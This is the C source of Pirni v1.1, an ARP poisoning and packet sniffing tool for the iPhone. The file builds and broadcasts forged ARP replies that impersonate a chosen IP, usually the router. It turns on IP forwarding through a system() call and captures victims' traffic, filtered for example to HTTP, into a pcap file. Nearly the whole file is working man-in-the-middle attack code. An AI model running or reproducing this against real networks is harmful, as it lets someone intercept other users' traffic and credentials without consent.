/* Pirni ARP poisoning and packet sniffing v1.1 -- n1mda, for the iPhone
	compile with (arm-apple-darwin9-)gcc pirni.c -o pirni -lpcap -lnet -pthread */
	
#include "pirni.h"

void print_usage(char *name)
{
	printf("Pirni ARP Spoofer and packet sniffer v1.1\n\n");
	printf("Usage:\t%s -s source_ip -f [BPF_Filter] -o log.pcap\n", name);
	printf("Ex:\t%s -s 192.168.0.1 -f \"tcp dst port 80\" -o log.pcap\n", name);
	printf("Where:\t source_ip is the IP-adress you want to spoof, most likely the router\n");
	printf("Where:\t [BPF_Filter] is the Berkley Packet Filter to only collect interesting packets. Read the userguide\n\n");
	printf("You can later on transfer the dumpfile to your computer and open it with Wireshark (or any other packet analyzer that supports pcap) to analyze the traffic\n");
	
	return;
}

int main(int argc, char *argv[])
{
	/* Libnet init and headers */
	libnet_ptag_t	eth_tag, arp_tag;
	
	
	/* Error buffer and device */
	char			errbuf[LIBNET_ERRBUF_SIZE];
	char			*BPFfilter;
	static u_char	SrcHW[ETH_ALEN];
	static u_char	DstHW[ETH_ALEN]					= {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	int c;


	/* Structure for local MAC */
	struct libnet_ether_addr *local_mac;
	
	if(getuid()) {
		printf("Must run as root\n");
		exit(1);
	}
	
	while((c = getopt(argc, argv, "ds:b:f:o:")) != -1) {
		switch(c) {
			case 'd':
						//arpSpoof = FALSE;
						break;
			case 's':
						routerIP = optarg;
						SrcIP = inet_addr(optarg);
						break;

			case 'f':
						BPFfilter = optarg;
						break;
			case 'o':
						outputFile = optarg;
						break;
			case '?':
						printf("Unrecognized option: -%c\n", optopt);
						exit(2);
						break;
			default:
						print_usage(argv[0]);
						exit(2);
					}
				}


	if(outputFile == NULL) {
		print_usage(argv[0]);
		exit(2);
	}
	if(BPFfilter == NULL) {
		BPFfilter = "";
	}
	
	device = "en0";
	
	printf("[+] Initializing packet forwarding: sysctl -w net.inet.ip.forwarding=1\n");
	system("sysctl -w net.inet.ip.forwarding=1");
	
	signal(SIGINT, sigint_handler);
	
	printf("[+] Initializing libnet on %s\n", device);
	l = libnet_init(LIBNET_LINK, device, errbuf);
	if(l == NULL) {
		printf("[-] libnet_init() failed: %s\n", errbuf);
		exit(1);
	}
	
	/* Get local MAC address */
	local_mac = libnet_get_hwaddr(l);
	if(local_mac != NULL) {
		printf("[*] Your MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n", \
									local_mac->ether_addr_octet[0],\
									local_mac->ether_addr_octet[1],\
									local_mac->ether_addr_octet[2],\
									local_mac->ether_addr_octet[3],\
									local_mac->ether_addr_octet[4],\
									local_mac->ether_addr_octet[5]);
		memcpy(SrcHW, local_mac, ETH_ALEN);
	} else {
		printf("[-] Could not parse your own MAC address: %s\n", libnet_geterror(l));
		libnet_destroy(l);
		return 0;
	}
	
	/* MOD :
	 * Loop each device to find en0 and then get its broadcast address ;)
	 * by evilsocket
	 */
	pcap_if_t* devices;
	if( pcap_findalldevs( &devices, errbuf ) == -1 ){
		printf("[-] Couldn't enumerate devices (%s) .\n", errbuf);
		exit(-1);
	}
	while( devices != NULL ){
    	if( strcmp( devices->name, "en0" ) == 0 ){
			pcap_addr_t *a = NULL;
			for( a = devices->addresses; a; a = a->next ){
				if( a->broadaddr ){
					DstIP = ((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr;
					printf( "[+] You broadcast address: %s\n", inet_ntoa( *(struct in_addr *)&DstIP ) );
					break;
				}
			}
			break;
		}
		devices = devices->next;
	}
	pcap_freealldevs(devices);

	/* Create ARP header */
	printf("[+] Creating ARP header\n");
	arp_tag = libnet_build_arp(
				1,						/* hardware type */
				0x0800,					/* proto type */
				6,						/* hw addr size */
				4,						/* proto addr size */
				ARP_REPLY,				/* ARP OPCODE */
				SrcHW,					/* source HW addr */
				(u_char *)&SrcIP,		/* src proto addr */
				DstHW,					/* dst HW addr */
				(u_char *)&DstIP,		/* dst IP addr */
				NULL,					/* no payload */
				0,						/* payload length */
				l,						/* libnet tag */
				0);						/* ptag see man */

	if(arp_tag == -1) {
		printf("[-] libnet_build_arp() failed: %s\n", libnet_geterror(l));
		exit(1);
	}
	
	/* Create Ethernet header */
	printf("[+] Creating Ethernet header\n");
	eth_tag = libnet_build_ethernet(
				DstHW,					/* dst HW addr */
				SrcHW,					/* src HW addr */
				0x0806,					/* Ether packet type */
				NULL,					/* pointer to payload */
				0,						/* payload size */
				l,						/* libnet tag */
				0);						/* Pointer to packet memory */
	
	if(eth_tag == -1) {
		printf("libnet_build_ethernet() failed: %s\n", libnet_geterror(l));
		exit(1);
	}
	
	/* Send ARP request */

	LaunchThread();
	initSniffer(BPFfilter, outputFile);
	
	libnet_destroy(l);
	return 0;
}

void sigint_handler(int sig)
{
	printf("[*] Removing packet forwarding: sysctl -w net.inet.ip.forwarding=0\n");
	system("sysctl -w net.inet.ip.forwarding=0");
	
	exit(0);
}
